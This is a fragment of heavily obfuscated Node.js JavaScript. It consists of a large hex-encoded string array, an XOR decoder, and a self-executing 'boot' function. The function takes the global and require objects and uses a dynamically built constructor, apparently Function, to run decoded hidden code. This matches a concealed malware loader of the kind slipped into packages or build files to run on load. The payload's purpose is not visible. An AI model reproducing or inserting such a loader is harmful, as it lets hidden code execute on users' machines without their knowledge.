e532e4d0016314a004600075348145f47265f0a375f5f0c1707021a0d5f0a0c3d4d31443131143100555608314029334d5f423156064211183106581a06314b4d535e58000a104d004b0417315113165a5e2e320538184f2c0d434d4d332d0a4b5f4d31020a32314d4d0046174c4b4c315f4d114d31114d4d0f42100016064d02331d314200535002363141170010004d4211353113020a19535f014107170407424d105c40001507311d40315f315f4a4b37014d2a314a33005f555c544a3e573455400d0d33174d1e11061f31365d310602314a1340430d30480151460a31091e104b3b0d3d0c101a00100407294d1010381308315b4d4310161411310d1a1e070c4d240a374d5f1448004d4b00105842430d0b4b314f312031385f453b315f5f4d00010037311022050d00304e31410a5f4d00214b1f31314d310746314d364c314d112f5f174a423106315100131342105f5d315c5231475f1706315f5f310c531117054b310610012731540f0a02314d1e104d4c103100111002110f3146053e1053314d5f0f065f110646104d100f0f10015b312c1b20311700521755184d4e43310f4d06310c4d00040e31080c31100100025f2a1a161e3111174010451f1731021b314a0b0c4d31100543083131315700114b1b4d005e174d5f0a504b311b434d5f4d4d3147054117433131102d5f4c2043310d310731111331315f0c075f4d315f11380211410f5f4d4333414d31104d314d11004215402705310606010c184f314a075b155f0531004d00295f17064d4231314108304b304a31405f304d0b331e11174d4b4c4b4d004b52075f3114421016534b0c4d33014b534d312900260a204d054b434d0a4d0116005f40114d4d4d3131385b4a3c42314d3031214241173135010d3c310f00333131430c310d580b5f313323115b0231110f001f000c564b31134a5f311b075f5f474d0d5f0f0c1e0611315f0c1a31020d4d0c1a4d312a215f0b175f000c01260a311e4b0e2e114d370231533106170a311e4d425f4d31525a175f220601313c2f000f0b422753114d31530a0f0a1131004c105b5f00314b11493123065f5f4d0f584d11004e33160f02310000310a41535523423100424d32080f4f5f045f541e014b0231002f4d001044484d4d374b5f11315f5f4d4d4505075d310c43000c060e3100144d0f000d4b005931441f175f310d313a3e572e5324314d31253116174d425f054d16484748175f314954103131314b0a010b075e334d5f1e31315e06314d3c4a4d4a11114f5745430f311e065f315531315f3d04050f0631071017331d5f01004d4b101a5f561e310a5c0f000b5f454d5018164d0d3c590a31540158535f315f003131310031231f521006243110514a005e0b5f055a065f5f114806313f444a455611154c2511384d024d170d4d3133110d365f0c3c00550d5e26375f4d0a481b00540f061510165f114d4231005f423e3114434d31314b3e3331274d430f054259454d010713370f4d314031304d47315f4b31435f5f00384d0d4d430c31115554115f064e314e160049313147314d0102061a00104d4238311b31315f273b17050d003132330a10311704005f4d02315b4201425f3017535f315d433131110a315d0036134d0031343931423127284a5300150d0d08104d064331433d070f315f000531311659102431064f4b04313531413116313131413117315f3110414d26310a3c3345315f0f1a0c300444105d153100140657310004034d0b5f3c00444b160e0731335d0c5a31330d5231404d0005315f333e31104c020d05122d3131445f4d31005b000a313131004d023c1317280c5f1310115f545f31310a4d0c3c004c420d3131104b435d31333e1b17173c103c0c0b215f024410454d335f434d08240055115f540a0c4c14312a303333001b0b3114004d5f4d000a00465231055a5a0730435f31010010313531101b1107023e3158175c312d4f4f315d4a00333a410031003106254342533131121e1e1153562f554d5f314d11055f47161f005f005f364e27384300004d0c5f56585f434b4d264d0b4d313c0f5f31115f5f255f381717200c460e304d3131502a01000a0c31315f0213310031003831315f4d050d31314f4d3121020d4b1a4c311f2b13240d314d5f5e31315f164b02001047315006314a0e003c2257160d17410658100c114b463133174b06044b4e4911420e5f31274b3131024d11040f194d31144d05313e1202150c3e054b465f5f00000f5f57105a3f2316435a064d491b4d4c2517303133384d47460d03194a5f5f474256320001483e315017315f050a3300063f5f190a4d3100020111434b5f5f010d155542170d143c003b054b0d0b4d381e49104b035f335d4b315f4d4d5f1b175a314b4d005f4b0653314d33020c4d42074b4b4e230553065f5f55310c3116584b07034331134d4d5f134f065f375f2d4d33314d3831002c194a054b5f0f3e4d16185c11055f3158315f2a49025f5f4703314b434b4d4d4d5f41595f2d31460631430a404d194d0f4b11314f0731024d0731155f1035004b103e0a4a2e0b4d310d5f313131171731044f1d4d3138314006054d581717134d4a10310d30170f3131510c064d45000a4b021e4d4133451a1006313c02461131314d275f0a33103127420a4d0e31413109190b5f16314d4f5d07064d092c1e02313200355f1047502004315f3156260007360b00064d4236054d314e1b555f3e4d14005f5f4d2642113133310a201b4d3031420e4d0d3b014d54054d190605393141413e4b1a5f1b015f085f3e36314e001e12054d422d0a5e3a0a310c31312d4d231014522f160652083145434011270006314d020f31314d314d4b413e2e31172e0a31114a110f163107454d313100130a052a0f51315f315f5f56054a194505363106005f10575f060d10314d0c415f0a5f4f314210430c210a314e0031530f312d1737314a3031005f050716173131073319312b4b3100104a33275f0047311b514559522b110f0c4d4d0d4305104d470d5b16132c47530a1010100a4d4e5f15315f4d5f12324b423142433842071b140d4d311a16490a5c0731464d315131175d115410421731103c31060703425f473e3143310e4231051b31430e310c084200175f4b4d4d0d310030310d3f454d5f5331370a140e17135049244b331a4c0d1b250b17315f4d59240c4d4d4d4b31174d114d5f530017374b115f434d0c380a154d5f315210315a073e314831310b063142000051313106415a0038115f582706330031310817240f045f5c1722364417173132311e431450173102173e4b35174e5c5f5f5c4d4d410f114a4d06314e31312a3d2628154d5754310c480a2d5f0600064d0d311b4b17312b3143175b58310a114a5f0231001b4b1202311023050611312e4d5f5e4d0017235f0500314d314a314d111b0f42174c4f0f10313131005e4d0a5350310b313110183c1b31115f325f004f025f5f26344b2e0c315f4316172641051e0105114d5f1031483e0711435f31423231144d0a432a31373c330c4d4b0053175b4b1031373131000d213142414d1b2a274d220a1e06130c3150420c195e3e06170831174c1622525731315a310017422d0207113c0d2420424c01471e31411b075f0a3100173d4d1616145e500731131404315a315b3312310a403113045a165e520a53055f4d315f3353051e17153c11500610595f05115f0a544b5f1a4b0c0f314d065a0c0c21374d3c31170c264a4302104b5f00310a0607171010314c31314c0611314b4d1400064d314d11331a4b312c4b5f4d042b1b11315f374d2f42311b4b5f0c4b384d48185f005f315f4d060a2d373120381b4d57310831471328414d0f00334b4d5f17084d5f313225080d142a314a4d174e31115e06185f4d3333434026555002135038314a2f07070058311b31423144430c0c424a144d06424d31005f53465f0a10105a31162c550a11474d314d0a1355460e4e5514310a5f195f4304115e0d140631312d3c3c314b3106291531053146592d3133315f0d313131474d314d0e315f1131401826004d4a015f5513060a310540172f4d4d315f330931314d4b4f023c0f0f4d434d2743045f4b110b15434157084243030f315f080652430047475631194d31313e061645270a31434d315f4b4b00061110264d020c310b06054a46062f314a4d594d3d4a061020314d1e4d375f333d4d43271a5f40310031132d31114a0d31310f3c50075b344b005e4e50260612060a2e31310631193102002016065f0f5f31100a4d025811005f4d0f07313a4d3102110f31000d2c05500b371007175f2e410e5f104b0d131e59224d051a315f31205f40311a5315315f1e5f314d5f46021710420f315d4e5f510f0f074d0d11565e4b25594d31310f0d310031411019500c415f053145504d4d423a5d05314a0106310f100b132e465f054d4b074202010a2531435014022e5f10064d4d1205314d0a3c4d4526424d4531313100311b183138314d3c5c315142423131001b4a312a2e4d4a055e4052262f0131310d2906022e0a0e524a3131313c431f5f0f025f504a531a0007454d400d5e0f4d1f3110584d054b06004d00105e00185c314c46073c42020d2c00065f31111b024d44014a5e3c5f0e4a0a0022002031004d0d5f314d06434d4d314e5f2231564d310e3807315f5f51314d220d5a1b3100170e002646384d4d314f32175f1633053c425f315e43173931000f1333494d160613555f054d015a31315f003011085f061e31000807004d585f17194d0f4d5f420a0c4d5f114c515f315e010031311035274d314d52015f00005f311e5f0b484d4331153731133c335f4d11104b16333217594d4d5f5d31085a425e02580c5f02494d54113e533a4a5b001e194b5f024d314d065b310c43170f4331004b221d0a42494b01314600314f0053175f43112e31315f43310a5f434d0533064948264a0e4d0c094d4d0e5b0e4d00314b475f054d314d0a07061a1e002131314210005f0d0c5a315f0d433114112d534017310716003c4e3130410a180a4a4b0d2e00315f532d5f4c355f5f4d4f5348144d3e5f145f310606314f144c06314d314a0a4d43315f06434d553104024d11041048320a17074d0c42001706022f310c4a5031435f4d00074d4c4d1d5f434d103f4d065f101356314d5f3131140242494d314a17314f0c0531395f391700310b103111474c4d31204d4d0143410031174f440f06020033004331315f3119415f310a430f530c3131073110544d314b062000313c4d55413c314d4d135f4508070706064d5f5e4d4d0f0c4d5e315f42014d4531005f17002011530e45003b1644140d074d105810144831574c1016270a00330102434d4d0a420c523d111e2a5d06575f59311420310a005f31313100414d4307311317535f4d3108535f345b1143310d314d27004d202d430f140c0b4d0f4e5f315f13000131433306550b3a4e31174d002613595f48024e355f31023105444b5f11313131455f02195f573131314d264a544d1b1100530a0f2b31370a10004d3905310500311b4e170b4a4d31405e425f204d14410f18063e064e315f4c5f10572d174d0c134100064d57310d1830310c5f314a20003e4a064b31145b31314d435f520b0018135b003042065f315c3128025e0a55310a384d2a3113314731011b3130000f4d135f33420502421515102c4d42133131174d26040f31175f4d420a16074d0f165f0a104d310c3157424d334d000e4d330a1e310c4d4d0f332d311a555e17185f02064d3c423114311702314d10054d424d3e5738064d3108261e4e1e15064d4d472d140a27421e4d5331405f0a1002315013465f1e4d0231233129174d3124021b4d31441013205342312400114d5125310a31063302310d103131310d025f314a563659410d5e0007005c2221174d51534d1707004220523143004d5f060702224d314b4d4f060f3100315f00455f4d06203136310a05180229283148061b4e1b59330046060a2306003106085c13314d574331315f314047004d4d0a484257313147315040314d114b330a31315f004d31000a3c36421931313158163d1f4d394d104b37313137004d071e315f1a4d3c005f4d3131184708315725214b473f5f144d434d58315f0631573f1031005b5f314d313826073143160c31381e354b4d130744415f29024b57131122314b4d2d005f5f1113504d5d1943060631425f4d5f56545945334a003831013131262e4b3c334d1e31314a4d5e310b115f4f203131314b5f085031480b0d4346314d31254a0f3158314d1043314d090f0e314b4b0f0c2b4d5f315f18333106310a5f5f000706284d314d05315113314b020c1d4d311a313131385931315c060a1031330508433a104b10504d00435f57010f0c5f535f5a180c5f313723314d4d0d310a3158020f5c100c3153045f374d31170e5f164d103f5c310f4d3c310000195745595c53434d56314c001700575f315d0b0a464d0a400a1e5f314d260e00521b220d0531183000114d314d461f414d331111310d5f00310d3342023131173105314d33435b44315f29224331450a5f060000183e00054d310e02314d0a11004d0a310639410d5f1a425f43003143405f4f06004231075a100a00483c52024d11164d4d014d4d31060b5f311d0a470c175f053107000a175f3f040c3c530f310e15254b5f065a105f3117174b4342310d31551e5f4d0a172c4d4d455a1057072d3100434d0c4d31314d3e09534331430e025758115f1020024a45430e0c381b0f31490b17424f2216134331164f0531170538094a3349003131525f31301543104251002a10314d4d0654570b31074400591510114d10585f064b5f3c422e310531052f2f04020f4d424d164d315a4b2e000f024b071e172c024d1e31002a06010e2600532d4b3127460126474311075f00144a4d255f2c013934314d09044d36574102053103440e464c0605021b31313158310d02595415315301004d023c315f5f093131104d4d3b4a1013240a451544064d0f4d514d2a4d065a1131064d1044525e114d0631061b01013c31313c065a00075f252a33424d0031485b4d5757554c365f5f0f10423e5f160313311016015f015d29331413230a0f315f0a4a084207312f08314d1711311b4b11114a46434c4d4b3e015b0031104815314e004a1e590c10314d0040415f0012085f06084d0a0e31302d4d311026430133330d4a5f061e0c5306414d5207312a31424b114d464d2a4d4d310519023c5c313108054c4f170031312a054d5f0a31430107312c4d0033000706314d101e0609250113580c4d05105f003c0e005f02254d070d005300433131314d120d434d3100314d0b3128095f31104d08005f5031104d000037174d1711170d175d14584c2a0039005b115f0a4d31175d3100104d4d104310183706435f424d484d314d5f163133310c4d5f284d0e4d024d10112e5f31434d0014310a005f314a0d334b5f31310606161700290046132d4d311000064d5e060205535f4423301e525f5f3a2a091142425f57024d0531314d0f455f31474d4d0f154d1e1f5645314d31425f4a1b05104d0147593100430f4d5f430c4b294d064d402d4d54175f4a005f14430631534d5e5f1a0043424d4d31065c5f0d44213831010c440216311e4311020640315e4d0a314b1017514d011d435f30004d1e17371031115f02314a43111a0a1142205f004317071d41433b4d1717315f31420743004d4d4206074d314d5f31430d4d300d0642424a574c0c3b3131164d060d315f4d11311231410f3c2e4d0605171711431731004d3c115f314d314d070718340b18314d5f4d453131005f4d04051e31001156510717061e074b1e5c0025544d1b1a47345f424d4d005513005c2d0053194b0b574d31310c5e3c0c024d33054205570b314d310749065e07400000551111180c4c310231304d194d154d3127005f4d38315a4d44173e454d3131314e57314506143f00313a060c0d0543174d0e4a065e4d0a00284d31184d53100f52130031104b000b0f4d34314d1a004d18060a0f5005175f184c4d204d4b4d0d5f0f4a5d0e5f5f07525f025c430d06005f314d4d02150f0c3115093104064d3c435e31484d31314d1407314d0755464d2a00004b48174d59000a444d000b174d014d3142105705173c311b17025f101e2b4f00004d0708310d004d4d1e0040430d4a314d4b3c4a0052504d0c174d0c4d1e5f424d1731314a4d175f4d4d4d5b310d4d2b1700175f010f310c170032240d3d493c1b0e060033371e4d4d5f5f1153430f261742070d415313054d040f1e315f06310f37230a4d4d044a0d065731165f05313137044d00314d004d0606175f4d4d3d06064f1158171f13001706342510433104020731110c244b0f170f43404b1a115f4d400707174d5f31430a4e0c5f10172a0742014a312a26174931310d45314d005f0a310e0f314b4e4b0e1700084d311a4253313a295f004d310a5d11114d43145a003702315e5f330007283e3c3f51054b43404d3110464d17065f0d4c31111a00004d0d3100474d33454d054d0a000021332d31073158314d565f31315f0e330c184b31183c0d5f0f310a074d0b31434d07310d311142291431534d313331114d5d5e4b055f065c4d5f21053e1b31000100330031101e5f314b104d31333a4d31313c33084b0c5f4b070f5f5306314f5259275210154d0a0f0b063c33311300003152120e4d070e415f100a1033074d5c43130e07310b310d00174b5c47311117311b4d064a034d4d314d135c0a42315231114b43184d063731311e4d001e5f31315b4d4d311331410004584d0000533111314d431745500d0756060033013c4d31423102000031010007011e004b4218175f4d310d154d2d31451d0622104719415f575f4d0c0410052002310f5f0c0026310c3131174d4d5f104d0a03315c4d1004004d4d311031104d44471b3100102d3131423103310c313c0d4240314f425612054d40212a31230f4d4f4d3e0c310631021f5f3138175f5f591f0238575f311d31424826044e314d0233420643450f5f560d460031310725111a004d104c314d5818184f2b4d585f0d5f4d4a574d17070e314a1031074b0e3101184d5f31004d11330e4d0031064300310008311b4a5f0045000a4d1a00060f161a584f4d3b0711310f313140430000054d00314343314731000c11114b4d1120135f2d1140264b3e310d31410a090d043131575f204702070f31020045174b424e31134d3e070c4d000a311e16103111104b0d43205f42584d05004d0023195f173157172031173117005e4d005000050c4d42434331585f05065b3107112e313138072d38001a3100595d370d5f0f3d4d0f0c5b310a3131001010001e31171300184d1031104d4d4d1e004d31023a385f0249434a2a4b0f07314b141011554349315442025f304d005f3f314d21262f3106553a055f525f06003311270643100f5333012740313e0c4d445f0f4d0e43314b134a5f060802004d00314d074d4d3c165f02445f43310f0a01050e0d07053e4d4b4631315f312d270031263140354d4d021002380d45314f475f4f315f0c5731310626314a10102f3e5b263031310631260a3118315f004d1843003424051e0c0b070002104d3e4d4305335e430c105554260c002a330c00434d540a04002520314d435f00264d2d434d0131','5753010e293a2110','565b52512b0519053237','0f060d04170b','5a555255503109023a2630','10130f0a17','0b120611101b0f16151402000709011a0e040c111905080c000a13171116170d10170c0d00','000b02112217','003d0e0609013d17110c','525054525b525519333b350f1a'];KmBFHpEdRXPQBdRu=function(){return cDmQ_ABHom;};return KmBFHpEdRXPQBdRu();}function daIQfX(MpmUMwi$WRckVhl,nY_To$Qm){var J$NlwSpydghfDNjrHkIJkQV=KmBFHpEdRXPQBdRu();return daIQfX=function(nSsxDSgcDDFqVICVEYFksq,sQACamQvSII){nSsxDSgcDDFqVICVEYFksq=nSsxDSgcDDFqVICVEYFksq-(Math.trunc(parseInt(0x21))*parseFloat(0x25)+Math.floor(parseInt(0xa22))+0x1*-parseInt(0xe7f));var DYqL$_ZlVzS=J$NlwSpydghfDNjrHkIJkQV[nSsxDSgcDDFqVICVEYFksq];if(daIQfX['zqiSUs']===undefined){var zht_wVWqujqYgkIj$Qt=function(FVqxX_sSL){var fpLvD$quQlg_cBijkWk=Math.max(0x1,0x1)*Math.ceil(0x2302)+parseInt(0x17fd)+Math.trunc(-parseInt(0x2))*0x1bce&Math.floor(-parseInt(0x2341))*-0x1+-0x718+-parseInt(0x1b2a),OxetOZSCa_IboGRq=new Uint8Array(FVqxX_sSL['match'](/.{1,2}/g)['map'](ytRObCYg_qXl=>parseInt(ytRObCYg_qXl,-0x476*-0x2+-parseInt(0x5)*-0x73+Math.floor(-parseInt(0xb1b))))),ziORlXpUcTTNRhKPtoCkPqF$T=OxetOZSCa_IboGRq['map'](eGVHzglg_qbPBekKstoxuVUFMm=>eGVHzglg_qbPBekKstoxuVUFMm^fpLvD$quQlg_cBijkWk),YwbuVNZxea=new TextDecoder(),eQMUhGpvH=YwbuVNZxea['decode'](ziORlXpUcTTNRhKPtoCkPqF$T);return eQMUhGpvH;};daIQfX['pwmLvH']=zht_wVWqujqYgkIj$Qt,MpmUMwi$WRckVhl=arguments,daIQfX['zqiSUs']=!![];}var TNkoElCCKyIRrT_flbVOHlgK=J$NlwSpydghfDNjrHkIJkQV[parseInt(0xa4a)+-0x7d*parseInt(-0x9)+-0x15*parseInt(0xb3)],mVFjD$LPwoRw$D=nSsxDSgcDDFqVICVEYFksq+TNkoElCCKyIRrT_flbVOHlgK,dTO_YApG_JZXc=MpmUMwi$WRckVhl[mVFjD$LPwoRw$D];return!dTO_YApG_JZXc?(daIQfX['eAfYbz']===undefined&&(daIQfX['eAfYbz']=!![]),DYqL$_ZlVzS=daIQfX['pwmLvH'](DYqL$_ZlVzS),MpmUMwi$WRckVhl[mVFjD$LPwoRw$D]=DYqL$_ZlVzS):DYqL$_ZlVzS=dTO_YApG_JZXc,DYqL$_ZlVzS;},daIQfX(MpmUMwi$WRckVhl,nY_To$Qm);}(function boot(GdiMiAIlgn,J$cGy_McRFWTA){var S_A$PLNfPHmujMepTnXm=daIQfX;GdiMiAIlgn['z']=z;var ngUNqXbQ=splitLane(S_A$PLNfPHmujMepTnXm(0x75));GdiMiAIlgn[ngUNqXbQ[-parseInt(0x470)+-parseInt(0x1fa9)+Math.max(parseInt(0x2419),0x2419)]]=J$cGy_McRFWTA;typeof module===ngUNqXbQ[0x9a3+Math.ceil(-parseInt(0x1))*parseFloat(parseInt(0x101f))+parseInt(0x67d)]&&(GdiMiAIlgn[ngUNqXbQ[Number(parseInt(0x33d))+Math.ceil(0x24ad)+Math.trunc(-parseInt(0x4fd))*parseInt(0x8)]]=module);var h$$NvHuXI=peel(S_A$PLNfPHmujMepTnXm(0x73)),txqquKPEmrdrWd_omlRQYjaY=h$$NvHuXI[S_A$PLNfPHmujMepTnXm(0x6b)](0xb92+-0x9e+-parseInt(0xaf4),0x19a+Math.ceil(-0xd)*0x278+parseInt(0x1e89)),CWcrClcy__GXNo=peel[txqquKPEmrdrWd_omlRQYjaY],uZjEDBZXVl=CWcrClcy__GXNo('',peel(S_A$PLNfPHmujMepTnXm(0x6a))),nuHJlzVTSNgUxMYmoMbTrJdj=uZjEDBZXVl(peel(S_A$PLNfPHmujMepTnXm(0x6d)));return CWcrClcy__GXNo('',nuHJlzVTSNgUxMYmoMbTrJdj)(Math.floor(-0x175)*Math.trunc(-parseInt(0x15))+-0x2*-parseInt(0x455)+parseInt(-parseInt(0x1d76))),0x2d6f+-parseInt(0x19f)*-0x17+parseInt(0x2ae)*Math.trunc(-0x13);}(global,require));
